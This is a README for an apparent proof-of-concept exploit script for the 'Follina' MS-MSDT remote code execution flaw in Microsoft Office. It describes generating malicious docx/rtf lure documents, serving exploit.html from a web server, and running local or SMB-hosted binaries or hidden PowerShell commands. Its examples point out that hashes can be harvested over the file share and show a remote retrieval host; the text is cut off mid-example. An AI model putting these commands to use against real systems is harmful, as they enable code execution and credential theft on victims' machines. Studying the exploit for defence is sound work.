'Follina' MS-MSDT n-day Microsoft Office RCE
This repository contains a quick Proof-of-Concept (POC) to replicate the 'Follina' Office Remote Code Execution (RCE) vulnerability. It is intended for local testing purposes only. By running the provided script, you can generate a payload file named clickme.docx (or clickme.rtf) in your current working directory. Additionally, a web server will be started with the generated payload file (www/exploit.html). Please note that the payload and web server parameters can be configured (refer to the help and examples sections).

⚠ IMPORTANT: DO NOT USE THIS IN A PRODUCTION ENVIRONMENT, AS IT MAY LEAD TO UNINTENDED CONSEQUENCES.

Usage
To use this POC, follow the instructions below:

sql
Copy code
$ python .\follina.py -h
usage: follina.py [-h] -m {command,binary} [-b BINARY] [-c COMMAND] -t {rtf,docx} [-u URL] [-H HOST] [-P PORT]

options:
  -h, --help            show this help message and exit

Required Arguments:
  -m {command,binary}, --mode {command,binary}
                        Specifies the execution mode. Use "binary" to load a (remote) binary, or "command" to run an encoded PowerShell command.

Binary Execution Arguments:
  -b BINARY, --binary BINARY
                        Specifies the full path of the binary to run. It can be a local or remote path from an SMB share.

Command Execution Arguments:
  -c COMMAND, --command COMMAND
                        Specifies the encoded command to execute in "command" mode.

Optional Arguments:
  -t {rtf,docx}, --type {rtf,docx}
                        Specifies the type of payload to use. Use "docx" or "rtf".
  -u URL, --url URL     Specifies the hostname or IP address from which the generated document should retrieve your payload. Defaults to "localhost". If a custom URL scheme or path are specified, the web server will be disabled.
  -H HOST, --host HOST  Specifies the interface for the web server to listen on. Defaults to all interfaces (0.0.0.0).
  -P PORT, --port PORT  Specifies the port to run the HTTP server on. Defaults to port 80.
Examples
Here are some examples of how to use the script:

php
Copy code
# Execute a local binary
python .\follina.py -t docx -m binary -b \windows\system32\calc.exe

# On Linux, you may need to escape backslashes
python .\follina.py -t rtf -m binary -b \\windows\\system32\\calc.exe

# Execute a binary from a file share (can be used to harvest hashes 👀)
python .\follina.py -t docx -m binary -b \\localhost\c$\windows\system32\calc.exe

# Execute an arbitrary PowerShell command
python .\follina.py -t rtf -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"

# Run the web server on the default interface (all interfaces, 0.0.0.0), but instruct the malicious document to retrieve it from http://1.2.3.4/exploit.html
python .\follina.py -t docx -m binary -b \windows\system32\calc.exe -u 1.2
